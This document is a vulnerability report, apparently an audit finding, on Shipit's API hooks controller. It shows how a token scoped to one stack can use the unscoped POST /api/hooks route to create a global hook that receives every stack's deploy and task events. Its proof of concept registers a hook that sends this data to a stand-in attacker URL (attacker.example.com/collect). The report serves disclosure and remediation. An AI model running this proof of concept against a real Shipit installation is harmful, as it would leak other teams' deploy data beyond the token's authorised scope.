### Title
Stack-scoped API tokens can create global hooks that leak/observe every other stack's task and deploy events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` only associates a created hook with a stack when a `stack_id` route parameter is explicitly present. When it is absent (the top-level, non-nested `POST /api/hooks` route), the hook is created with `stack_id: nil`, i.e. a **global** hook that receives every stack's events, regardless of the `stack_id` binding that is supposed to scope the authenticating `ApiClient` token to a single stack.

### Finding Description
`ApiClient` records can be scoped to a single stack (`belongs_to :stack, optional: true`), and `Api::BaseController#stacks` is meant to enforce that scoping for any stack-bound lookup: [1](#0-0) [2](#0-1) 

`Api::HooksController`, however, never goes through that scoped `stack` lookup for the "global hooks" path. It derives the hook's `stack_id` purely from whether a route parameter happens to be present: [3](#0-2) 

`config/routes.rb` exposes both a stack-nested route (`/api/stacks/*stack_id/hooks`) and a top-level, non-nested route mounted directly on the `api` namespace: [4](#0-3) 

Hitting the top-level route means `params[:stack_id]` is never set, so `stack_id` (the private helper) evaluates to `nil` and `hooks.create(params)` persists a `Hook` with `stack_id: nil` - a hook that is global by definition: [5](#0-4) 

Global hooks are delivered for every stack's events (`deploy`, `rollback`, `task`, `lock`, `commit_status`, `deployable_status`, `merge_status`, `merge`, `pull_request`, `stack`, `review_stack`) because `Hook.for_stack` always includes `stack_id: nil` hooks alongside the specific stack's hooks: [6](#0-5) 

The only gate on this action is the `write:hook` permission check; there is no additional check that the requesting `ApiClient`'s `stack_id` (if any) matches the target scope of the hook being created: [7](#0-6) 

This is the direct analog of the External Report's bug class: a binding that is supposed to hold ("the stack a token authorises" == "the stack a token's writes actually touch") is enforced only in the narrow, common-case code path (the nested, `stack_id`-bearing route) and silently omitted in an equally reachable alternate path (the top-level route), exactly as the liquidation check enforced LTV only against the initially-borrowed amount and omitted the growing interest component.

### Impact Explanation
An `ApiClient` token that is intentionally scoped to a single stack (created via the "Human" `api_clients` UI/`ApiClient.stack_id`) and granted only `write:hook` (plus whatever minimal permission is needed to operate its own stack) can call `POST /api/hooks` (the unscoped route) to register a `delivery_url` that will receive delivery payloads for **every** stack in the Shipit installation - deploy/rollback status transitions, task output URLs, commit statuses, and pull-request/merge events for stacks the token was never authorised to see. This is an unauthorized read of other stacks' task/deploy state via a token that was only supposed to authorise access to one stack, matching the High-severity criterion of "unauthenticated read of stack state, task streams or deploy output" through a token whose authorised scope does not match the scope of the data it can actually cause to be exfiltrated.

### Likelihood Explanation
Exploitation requires only an existing, legitimately-issued `ApiClient` token with the `write:hook` permission (a routine, low-privilege permission intended for stack-local hook management) - no repository write access, no GitHub App credentials, and no privileged Shipit account are needed. The mistake is a simple route/parameter oversight (top-level `resources :hooks` vs. nested `stack_id`-scoped `resources :hooks`), making it trivial and reliable to trigger once such a token is available.

### Recommendation
In `Api::HooksController`, reject hook creation/listing/management on the unscoped route entirely for stack-scoped `ApiClient`s, or require that `current_api_client.stack_id` be blank (i.e., an unscoped/"admin" client) before allowing `stack_id: nil` hooks to be created. At minimum, `hooks`/`stack_id` should be derived through the same `stacks`/`stack` scoping helper used elsewhere in `BaseController`, so that a stack-bound token can never create or view a hook whose `stack_id` falls outside `current_api_client.stack_id`.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack_id: 1` with `permissions: ['write:hook']` (a plausible, minimally-privileged token for managing that one stack's hooks).
2. Authenticate with this token and call:
   `POST /api/hooks` with `{"delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "commit_status"]}` (note: no `stack_id` in the path, unlike `/api/stacks/*stack_id/hooks`).
3. This creates a `Hook` record with `stack_id: nil` (global), per `app/controllers/shipit/api/hooks_controller.rb:46-52` and `app/models/shipit/hook.rb:93-96`.
4. Any subsequent deploy, rollback, task, or commit-status event on **any** stack in the installation - not just stack 1 - triggers `Hook.deliver`, which matches the global hook via `for_stack`, and its payload (including `SHIPIT_LINK`, commit SHAs, deploy status, task IDs) is POSTed to the attacker's `delivery_url`, per `app/models/shipit/hook.rb:93-119`.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
